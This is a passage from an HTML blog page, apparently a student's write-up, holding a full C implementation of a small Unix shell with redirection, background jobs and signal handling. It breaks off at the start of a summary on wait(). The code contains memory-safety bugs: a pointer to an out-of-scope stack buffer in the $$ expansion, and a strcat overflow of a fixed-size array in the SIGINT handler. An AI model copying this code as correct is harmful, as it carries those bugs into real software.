class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_INPUT_LENGTH 2048</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ARG_NUMBER 512</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SPLIT_CHAR <span class=\"string\">&quot; \\t\\r\\n&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> allowBg = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">readLine</span><span class=\"params\">()</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"type\">size_t</span> maxLength = MAX_INPUT_LENGTH;</span><br><span class=\"line\">    <span class=\"type\">char</span> *line = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>) * maxLength);</span><br><span class=\"line\">    fgets(line, maxLength, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; maxLength; i++)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (line[i] == <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            line[i] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> line;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"type\">char</span> **<span class=\"title function_\">parse</span><span class=\"params\">(<span class=\"type\">char</span> *line, <span class=\"type\">int</span> *num, <span class=\"type\">int</span> *back)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"type\">size_t</span> maxNumber = MAX_ARG_NUMBER;</span><br><span class=\"line\">    <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> **arr = (<span class=\"type\">char</span> **)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span> *) * maxNumber);</span><br><span class=\"line\">    <span class=\"type\">char</span> *token;</span><br><span class=\"line\">    token = strtok(line, SPLIT_CHAR);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (token != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        arr[i] = token;</span><br><span class=\"line\">        <span class=\"comment\">// replace $$</span></span><br><span class=\"line\">        <span class=\"type\">int</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; <span class=\"built_in\">strlen</span>(arr[i])<span class=\"number\">-1</span>; j++)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (arr[i][j] == <span class=\"string\">&#x27;$&#x27;</span> &amp;&amp; arr[i][j + <span class=\"number\">1</span>] == <span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">            {</span><br><span class=\"line\">                arr[i][j] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">                arr[i][j+<span class=\"number\">1</span>] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">                <span class=\"type\">char</span> t[<span class=\"number\">10</span>];</span><br><span class=\"line\">                <span class=\"type\">char</span> newArg[<span class=\"number\">50</span>];</span><br><span class=\"line\">                <span class=\"built_in\">memset</span>(t, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">                <span class=\"built_in\">memset</span>(newArg, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\">                <span class=\"built_in\">strncpy</span>(newArg, arr[i], j);</span><br><span class=\"line\">                <span class=\"built_in\">sprintf</span>(t, <span class=\"string\">&quot;%d&quot;</span>, getpid());</span><br><span class=\"line\">                <span class=\"built_in\">strcat</span>(newArg, t);</span><br><span class=\"line\">                <span class=\"comment\">// sprintf(arr[i], newArg);</span></span><br><span class=\"line\">                arr[i] = newArg;</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">        token = strtok(<span class=\"literal\">NULL</span>, SPLIT_CHAR);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &gt;= <span class=\"number\">2</span> &amp;&amp; <span class=\"built_in\">strcmp</span>(arr[i - <span class=\"number\">1</span>], <span class=\"string\">&quot;&amp;&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        arr[i - <span class=\"number\">1</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">            i--;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(allowBg == <span class=\"number\">1</span>){</span><br><span class=\"line\">            *back = <span class=\"number\">1</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    *num = i;</span><br><span class=\"line\">    arr[i] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">printStatus</span><span class=\"params\">(<span class=\"type\">int</span> status)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (status == <span class=\"number\">0</span> || status == <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;exit value %d\\n&quot;</span>, status);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;terminated by signal %d\\n&quot;</span>, status);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">catchSIGTSTP</span><span class=\"params\">(<span class=\"type\">int</span> sig)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allowBg == <span class=\"number\">1</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"type\">char</span> *message = <span class=\"string\">&quot;Entering foreground-only mode(&amp; is now ignored)\\n&quot;</span>;</span><br><span class=\"line\">        write(STDOUT_FILENO, message, <span class=\"number\">49</span>);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        allowBg = <span class=\"number\">0</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"type\">char</span> *message = <span class=\"string\">&quot;Exiting foreground-only mode\\n&quot;</span>;</span><br><span class=\"line\">        write(STDOUT_FILENO, message, <span class=\"number\">30</span>);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        allowBg = <span class=\"number\">1</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">catchSIGINT</span><span class=\"params\">(<span class=\"type\">int</span> signo)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"type\">char</span> message[] = <span class=\"string\">&quot;terminated by signal &quot;</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> t[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(t, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">sprintf</span>(t, <span class=\"string\">&quot;%d&quot;</span>, signo);</span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(message, t);</span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(message, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, message);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">newProcess</span><span class=\"params\">(<span class=\"type\">char</span> **arr, <span class=\"type\">int</span> num, <span class=\"type\">int</span> back)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"type\">pid_t</span> pid = fork();</span><br><span class=\"line\">    <span class=\"type\">int</span> status, fd;</span><br><span class=\"line\">    <span class=\"type\">int</span> input_flag = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> output_flag = <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; num; i++)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(arr[i], <span class=\"string\">&quot;&lt;&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            input_flag = i;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(arr[i], <span class=\"string\">&quot;&gt;&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            output_flag = i;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pid == <span class=\"number\">0</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigaction</span> <span class=\"title\">sigint</span> =</span> {<span class=\"number\">0</span>};</span><br><span class=\"line\">        sigint.sa_handler = catchSIGINT;</span><br><span class=\"line\">        sigemptyset(&amp;sigint.sa_mask);</span><br><span class=\"line\">        sigint.sa_flags = <span class=\"number\">0</span>;</span><br><span class=\"line\">        sigaction(SIGINT, &amp;sigint, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// input redirect</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (input_flag &gt; <span class=\"number\">-1</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            fd = open(arr[input_flag + <span class=\"number\">1</span>], O_RDONLY, <span class=\"number\">0644</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>)</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;cannot open %s for input\\n&quot;</span>, arr[input_flag + <span class=\"number\">1</span>]);</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (dup2(fd, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">                {</span><br><span class=\"line\">                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;: Could not redirect stdin for input file %s\\n&quot;</span>, arr[input_flag + <span class=\"number\">1</span>]);</span><br><span class=\"line\">                    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">                }</span><br><span class=\"line\">                arr[input_flag] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                close(fd);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"comment\">//output redirect</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (output_flag &gt; <span class=\"number\">-1</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            fd = open(arr[output_flag + <span class=\"number\">1</span>], O_WRONLY | O_CREAT | O_TRUNC, <span class=\"number\">0644</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>)</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;cannot not open %s for output\\n&quot;</span>, arr[output_flag + <span class=\"number\">1</span>]);</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (dup2(fd, <span class=\"number\">1</span>) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">                {</span><br><span class=\"line\">                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Could not redirect stdout for output file %s\\n&quot;</span>, arr[output_flag + <span class=\"number\">1</span>]);</span><br><span class=\"line\">                    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">                }</span><br><span class=\"line\">                arr[output_flag] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                close(fd);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (back == <span class=\"number\">1</span> &amp;&amp; input_flag &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            fd = open(<span class=\"string\">&quot;/dev/null&quot;</span>, O_RDONLY, <span class=\"number\">0644</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>)</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Could not open \\&quot;/dev/null\\&quot;\\n&quot;</span>);</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (dup2(fd, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">                {</span><br><span class=\"line\">                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Could not redirect stdin to \\&quot;/dev/null\\&quot;\\n&quot;</span>);</span><br><span class=\"line\">                    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">                }</span><br><span class=\"line\">                close(fd);</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"comment\">// printf(&quot;%c\\n&quot;, arr[0][0]);</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (execvp(arr[<span class=\"number\">0</span>], arr) == <span class=\"number\">-1</span> &amp;&amp; arr[<span class=\"number\">0</span>][<span class=\"number\">0</span>] &gt;= <span class=\"string\">&#x27;a&#x27;</span> &amp;&amp; arr[<span class=\"number\">0</span>][<span class=\"number\">0</span>] &lt;= <span class=\"string\">&#x27;z&#x27;</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s: no such file or directory\\n&quot;</span>, arr[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">            <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pid &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Smallsh !\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    { <span class=\"comment\">// parent</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (back == <span class=\"number\">1</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Background pid is %d.\\n&quot;</span>, pid);</span><br><span class=\"line\">            fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        {</span><br><span class=\"line\">            waitpid(pid, &amp;status, WUNTRACED);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (WIFEXITED(status))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (WEXITSTATUS(status));</span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (WIFSIGNALED(status))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (WTERMSIG(status));</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> status;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">executeCommand</span><span class=\"params\">(<span class=\"type\">char</span> **arr, <span class=\"type\">int</span> status, <span class=\"type\">int</span> num, <span class=\"type\">int</span> back)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (arr[<span class=\"number\">0</span>] == <span class=\"literal\">NULL</span> || <span class=\"built_in\">strcmp</span>(<span class=\"string\">&quot;#&quot;</span>, arr[<span class=\"number\">0</span>]) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> status;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(arr[<span class=\"number\">0</span>], <span class=\"string\">&quot;exit&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(arr[<span class=\"number\">0</span>], <span class=\"string\">&quot;status&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        printStatus(status);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(arr[<span class=\"number\">0</span>], <span class=\"string\">&quot;cd&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"type\">char</span> *directory;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (arr[<span class=\"number\">1</span>] == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            directory = getenv(<span class=\"string\">&quot;HOME&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            directory = arr[<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (chdir(directory) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;cd: No such file or directory\\n&quot;</span>);</span><br><span class=\"line\">            fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">return</span> status;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"type\">int</span> t = newProcess(arr, num, back);</span><br><span class=\"line\">        <span class=\"comment\">// printf(&quot;------------%d---\\n&quot;,t);</span></span><br><span class=\"line\">        <span class=\"comment\">// fflush(stdout);</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"type\">char</span> *input;</span><br><span class=\"line\">    <span class=\"type\">char</span> **arr;</span><br><span class=\"line\">    <span class=\"type\">int</span> status = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigaction</span> <span class=\"title\">sigint</span> =</span> {<span class=\"number\">0</span>};</span><br><span class=\"line\">    sigint.sa_handler = SIG_IGN;</span><br><span class=\"line\">    sigemptyset(&amp;sigint.sa_mask);</span><br><span class=\"line\">    sigint.sa_flags = <span class=\"number\">0</span>;</span><br><span class=\"line\">    sigaction(SIGINT, &amp;sigint, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigaction</span> <span class=\"title\">sigtstp</span> =</span> {<span class=\"number\">0</span>};</span><br><span class=\"line\">    sigtstp.sa_handler = catchSIGTSTP;</span><br><span class=\"line\">    sigfillset(&amp;sigtstp.sa_mask);</span><br><span class=\"line\">    sigtstp.sa_flags = <span class=\"number\">0</span>;</span><br><span class=\"line\">    sigaction(SIGTSTP, &amp;sigtstp, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"type\">int</span> num = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> back = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;: &quot;</span>);</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        input = readLine();</span><br><span class=\"line\">        arr = parse(input, &amp;num, &amp;back);</span><br><span class=\"line\">        status = executeCommand(arr, status, num, back);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//background</span></span><br><span class=\"line\">        <span class=\"type\">pid_t</span> childPid = waitpid(<span class=\"number\">-1</span>, &amp;status, WNOHANG);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (childPid &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        {</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;background pid %d is done: &quot;</span>, childPid);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (WIFEXITED(status))</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;exit value %d\\n&quot;</span>, WEXITSTATUS(status));</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;terminated by signal %d\\n&quot;</span>, status);</span><br><span class=\"line\">            fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">        }</span><br><span class=\"line\">        fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(input);</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(arr);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><h2 id=\"wait-函数\"><a href=\"#wait-函数\" class=\"headerlink\" title=\"wait()函数\"></a>wait()函数</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span 